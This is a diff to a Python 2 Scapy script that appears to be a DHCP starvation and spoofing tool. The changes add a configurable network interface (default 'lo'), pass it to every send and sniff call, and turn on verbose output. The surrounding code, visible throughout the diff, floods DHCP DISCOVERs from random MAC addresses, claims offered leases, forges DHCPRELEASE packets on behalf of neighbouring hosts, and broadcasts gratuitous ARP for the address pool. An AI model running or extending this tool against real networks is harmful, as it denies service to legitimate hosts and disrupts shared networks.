@@ -3,7 +3,8 @@ from scapy.all import *
 import string,binascii,signal,sys,threading,socket,struct
 
 conf.checkIPaddr = False
-verbose = False
+interface = "lo"
+verbose = True
 
 
 def signal_handler(signal, frame):
@@ -85,13 +86,13 @@ def neighbors():
 #
 def release():
    global dhcpsmac,dhcpsip,nodes
-   print "Sending Release"
+   print "Sending DHCPRELEASE on " + interface
    myxid=random.randint(1, 900000000)
    #
    #iterate over all ndoes and release their IP from DHCP server
    for cmac,cip in nodes.iteritems():
      dhcp_release = Ether(src=cmac,dst=dhcpsmac)/IP(src=cip,dst=dhcpsip)/UDP(sport=68,dport=67)/BOOTP(ciaddr=cip,chaddr=[mac2str(cmac)],xid=myxid,)/DHCP(options=[("message-type","release"),("server_id",dhcpsip),("client_id",chr(1),mac2str(cmac)),"end"])
-     sendp(dhcp_release,verbose=0)
+     sendp(dhcp_release,verbose=0,iface=interface)
      if verbose: print "%r"%dhcp_release
 
 #
@@ -103,7 +104,7 @@ def garp():
   for ip in pool:
     m=randomMAC()
     arpp =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/ARP(hwsrc=m,psrc=ip,hwdst="00:00:00:00:00:00",pdst=ip)
-    sendp(arpp,verbose=0)
+    sendp(arpp,verbose=0,iface=interface)
     if verbose: print "%r"%arpp
 
 #
@@ -121,8 +122,8 @@ class send_dhcp(threading.Thread):
        myxid=random.randint(1, 900000000)
        hostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
        dhcp_discover =  Ether(src=m,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(m)],xid=myxid)/DHCP(options=[("message-type","discover"),("hostname",hostname),"end"])
-       print "\n\n\nSending DHCP DISCOVER"
-       sendp(dhcp_discover)
+       print "\n\n\nSending DHCPDISCOVER on " + interface
+       sendp(dhcp_discover,verbose=0,iface=interface)
        time.sleep(timer)
 
 #
@@ -139,7 +140,7 @@ class sniff_dhcp(threading.Thread):
    def run(self):
      global dhcpdos
      while not self.kill_received and not dhcpdos:
-       sniff(filter=self.filter,prn=self.detect_dhcp, store=0,timeout=3)
+       sniff(filter=self.filter,prn=self.detect_dhcp,store=0,timeout=3,iface=interface)
        print "timeout waiting on dhcp packet count %d"%self.dhcpcount
        self.dhcpcount+=1
        if self.dhcpcount==2: dhcpdos=True
@@ -162,18 +163,18 @@ class sniff_dhcp(threading.Thread):
           localm=unpackMAC(pkt[BOOTP].chaddr)
           myhostname=''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(8))
         
-          print("DHCPOFFER detected from " + pkt[Ether].src,sip + " Handing out IP: "+myip)
+          print("DHCPOFFER detected from " + pkt[Ether].src,sip + " on " + interface + ", handing out IP: "+myip)
           dhcp_req = Ether(src=localm,dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=[mac2str(localm)],xid=localxid)/DHCP(options=[("message-type","request"),("server_id",sip),("requested_addr",myip),("hostname",myhostname),("param_req_list","pad"),"end"])
-          sendp(dhcp_req,verbose=0)
+          sendp(dhcp_req,verbose=0,iface=interface)
           print "sent DHCP Request for "+myip
       elif ICMP in pkt:
          if pkt[ICMP].type==8:
            myip=pkt[IP].dst
            mydst=pkt[IP].src
-           print "ICMP request from "+mydst+" for "+myip 
+           print "ICMP request from " + mydst + " for " + myip + " on " + interface
            icmp_req=Ether(src=randomMAC(),dst=pkt.src)/IP(src=myip,dst=mydst)/ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)/"12345678912345678912"
 	   if verbose: print "%r"%icmp_req 
-           #sendp(icmp_req,verbose=0)
+           #sendp(icmp_req,verbose=0,iface=interface)
            #print "ICMP response from "+myip+" to "+mydst 
 
 
@@ -199,7 +200,7 @@ def main(args):
 
   while dhcpsip==None:
    time.sleep(1)
-   print "waiting for first DHCP Server response"
+   print "waiting for first DHCP Server response on " + interface
 
   neighbors()
   release()
